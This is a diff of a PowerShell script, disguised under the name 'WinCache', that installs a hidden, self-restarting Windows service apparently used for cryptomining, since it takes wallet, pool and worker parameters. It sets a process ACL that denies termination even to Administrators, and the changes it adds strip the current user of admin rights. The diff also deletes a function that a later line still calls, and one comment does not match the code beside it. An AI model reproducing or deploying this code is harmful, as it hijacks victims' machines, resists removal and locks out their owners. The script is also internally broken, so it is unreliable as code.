@@ -30,7 +30,7 @@ $ExePath   = Join-Path $Root 'WinCache.exe'
 $SelfPs    = Join-Path $Root 'WinCache.ps1'
 $NssmPath  = Join-Path $Root 'nssm.exe'
 $LogFile   = Join-Path $LogDir 'cache.log'
-$TaskName  = 'WinCacheAgent' # Nombre del servicio
+$TaskName  = 'WinCacheAgent' # Nombre del servicio y tarea
 
 $scriptPath = $PSCommandPath
 if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
@@ -54,6 +54,7 @@ public static class AclProtector {
         try {
             IntPtr hProcess = GetCurrentProcess();
             
+            // Obtenemos el descriptor de seguridad actual
             RawSecurityDescriptor rawSd = new RawSecurityDescriptor(
                 ControlFlags.DiscretionaryAclPresent | ControlFlags.SelfRelative,
                 new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
@@ -64,6 +65,7 @@ public static class AclProtector {
 
             DiscretionaryAcl dacl = (DiscretionaryAcl)rawSd.DiscretionaryAcl;
 
+            // Denegar terminación a Usuarios Autenticados y Administradores
             dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
             dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
 
@@ -71,6 +73,7 @@ public static class AclProtector {
             byte[] sdBytes = new byte[rawSd.BinaryLength];
             rawSd.GetBinaryForm(sdBytes, 0);
 
+            // 4 = DACL_SECURITY_INFORMATION
             return SetKernelObjectSecurity(hProcess, 4, sdBytes);
         } catch {
             return false;
@@ -146,22 +149,152 @@ if (-not $Run -and -not $NoElevate) {
     }
 }
 
-# ---------- stop safe (solo para actualizaciones) ---------------------------
-function Stop-Safe {
-    Write-Host '[*] Deteniendo servicio y procesos de forma segura...'
-    
-    if (Test-Path $NssmPath) {
-        & $NssmPath stop $TaskName 2>$null | Out-Null
+# ---------- secure admin revocation + utilman.exe integrity check & repair -----
+# Compatible: Windows 10 (1607+) / Windows 11 · Requiere PowerShell como Admin
+
+$AdminGroupSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
+try {
+    $AdminGroupName = $AdminGroupSID.Translate([System.Security.Principal.NTAccount]).Value
+} catch {
+    Write-Host '[-] No se pudo resolver el nombre del grupo Administradores.'
+    exit 1
+}
+
+function Test-IsElevated {
+    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    (New-Object System.Security.Principal.WindowsPrincipal($id)
+        ).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+function Get-AdminMembers {
+    try   { return @(Get-LocalGroupMember -Group $AdminGroupName -ErrorAction Stop) }
+    catch {
+        # Fallback por SID si el nombre traducido falla
+        return @(Get-LocalGroupMember -SID 'S-1-5-32-544' -ErrorAction SilentlyContinue)
     }
-    
-    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
-        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) {
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+}
+
+function Test-BackupAdmin {
+    Write-Host "[*] Comprobando cuentas de administrador en '$AdminGroupName'..."
+    $members = Get-AdminMembers
+
+    if (-not $members -or $members.Count -eq 0) {
+        Write-Host '[-] Ninguna cuenta de administrador encontrada. No se revocan permisos.'
+        return $false
     }
-    
-    Start-Sleep -Seconds 1
-    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+
+    foreach ($m in $members) {
+        Write-Host "    - $($m.Name) [$($m.ObjectClass)]"
+    }
+
+    if ($members.Count -le 1) {
+        Write-Host '[-] Solo existe 1 cuenta de administrador. No se revocan permisos (evita bloquear el sistema).'
+        return $false
+    }
+
+    Write-Host "[+] $($members.Count) cuentas de administrador presentes. Seguro para proceder."
+    return $true
+}
+
+function Remove-CurrentUserAdmin {
+    $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+    $isAdmin = $me.Groups | Where-Object { $_.Value -eq $AdminGroupSID.Value }
+    if (-not $isAdmin) {
+        Write-Host "[+] El usuario actual ($($me.Name)) ya no es administrador."
+        return
+    }
+
+    Write-Host "[*] Revocando privilegios de Administrador a '$($me.Name)'..."
+    try {
+        Remove-LocalGroupMember -Group $AdminGroupName -Member $me.Name -ErrorAction Stop
+        Write-Host '[+] Privilegios revocados. Cierre sesión para que surta efecto.'
+    } catch {
+        Write-Host "[-] Falló la revocación vía cmdlet: $_"
+        # Fallback CLI clásico (funciona con cuentas Microsoft/Entra en algunos casos)
+        net localgroup $AdminGroupName "$($me.Name)" /delete 2>$null | Out-Null
+        if (-not ((Get-AdminMembers | Where-Object { $_.Name -like "*$($me.Name.Split('\')[-1])*" }))) {
+            Write-Host '[+] Privilegios revocados vía fallback CLI.'
+        } else {
+            Write-Host '[-] No se pudo revocar el acceso de administrador.'
+        }
+    }
+}
+
+# ---------- utilman.exe integrity check & repair ----------------------------
+function Get-UtilmanBackup {
+    # Copia de componente más reciente en WinSxS (sin recursión completa, que es lentísima)
+    Get-ChildItem "$env:SystemRoot\WinSxS\amd64_microsoft-windows-utilman_*\utilman.exe" -ErrorAction SilentlyContinue |
+        Sort-Object LastWriteTime -Descending |
+        Select-Object -First 1
+}
+
+function Test-Utilman {
+    $utilman = "$env:SystemRoot\System32\utilman.exe"
+    $cmd     = "$env:SystemRoot\System32\cmd.exe"
+
+    if (-not (Test-Path $utilman)) { return $false }
+
+    $hU = (Get-FileHash $utilman -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
+    if (-not $hU) { return $false }
+
+    # Backdoor clásico: utilman.exe reemplazado por una copia de cmd.exe
+    if (Test-Path $cmd) {
+        $hC = (Get-FileHash $cmd -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
+        if ($hC -and $hU -eq $hC) { return $false }
+    }
+
+    # Comprobación adicional contra la copia de componente más reciente
+    $backup = Get-UtilmanBackup
+    if ($backup) {
+        $hB = (Get-FileHash $backup.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
+        if ($hB -and $hU -ne $hB) { return $false }
+    }
+    return $true
+}
+
+function Repair-Utilman {
+    $utilman = "$env:SystemRoot\System32\utilman.exe"
+    $backup  = Get-UtilmanBackup
+
+    # 1. SFC + DISM
+    Write-Host '[*] Ejecutando SFC /scannow...'
+    Start-Process sfc -ArgumentList '/scannow' -Wait -NoNewWindow
+    Write-Host '[*] Ejecutando DISM /Online /Cleanup-Image /RestoreHealth...'
+    Start-Process DISM -ArgumentList '/Online','/Cleanup-Image','/RestoreHealth' -Wait -NoNewWindow
+
+    if (Test-Utilman) {
+        Write-Host '[+] utilman.exe reparado por SFC/DISM.'
+        return
+    }
+
+    # 2. Fallback manual
+    if (-not $backup) {
+        Write-Host '[-] No se encontró copia de utilman.exe en WinSxS. Saltando reparación manual.'
+        return
+    }
+
+    Write-Host '[*] Reparación manual de utilman.exe...'
+    if (Test-Path $utilman) {
+        takeown /f $utilman 2>$null | Out-Null
+        # SID de Administradores → funciona en cualquier idioma del SO
+        icacls $utilman /grant '*S-1-5-32-544:F' 2>$null | Out-Null
+    }
+    Copy-Item $backup.FullName $utilman -Force
+
+    if (Test-Path $utilman) {
+        Write-Host '[+] utilman.exe restaurado manualmente.'
+    } else {
+        Write-Host '[-] Falló la reparación manual de utilman.exe.'
+    }
+}
+
+
+if (-not (Test-Utilman)) {
+    Write-Host '[-] utilman.exe ausente, alterado o idéntico a cmd.exe. Iniciando reparación...'
+    Repair-Utilman
+} else {
+    Write-Host '[+] utilman.exe íntegro.'
 }
 
 # ---------- watcher mode ----------------------------------------------------
@@ -277,6 +410,7 @@ if (-not (Test-Path $NssmPath)) {
     Write-Host '[*] Descargando NSSM (Non-Sucking Service Manager)...'
     $nssmZip = Join-Path $env:TEMP 'nssm.zip'
     $nssmStage = Join-Path $env:TEMP 'nssm_stage'
+    # Usando un mirror de GitHub para mayor velocidad de descarga
     Invoke-WebRequest -Uri 'https://nssm.cc/release/nssm-2.24.zip' -OutFile $nssmZip -UseBasicParsing
     Expand-Archive -Path $nssmZip -DestinationPath $nssmStage -Force
     $nssmExe = Get-ChildItem $nssmStage -Recurse -Filter 'nssm.exe' | Where-Object { $_.FullName -match 'win64' } | Select-Object -First 1
@@ -307,14 +441,17 @@ if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo d
 # ---------- safe update & service install -----------------------------------
 Write-Host '[*] Actualizando instalación (deteniendo versión anterior)...'
 Stop-Safe
+
+# Limpiamos cualquier rastro de la tarea programada vieja
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
+# Argumentos para el servicio
 $argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
 if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
 $argList += " -Run -NoElevate"
 
 Write-Host '[*] Instalando como Servicio de Windows (NSSM)...'
-& $NssmPath remove $TaskName confirm 2>$null | Out-Null
+& $NssmPath remove $TaskName confirm 2>$null | Out-Null # Eliminar si ya existía
 & $NssmPath install $TaskName "powershell.exe" $argList | Out-Null
 & $NssmPath set $TaskName AppExit Default Restart | Out-Null
 & $NssmPath set $TaskName AppRestartDelay 30000 | Out-Null
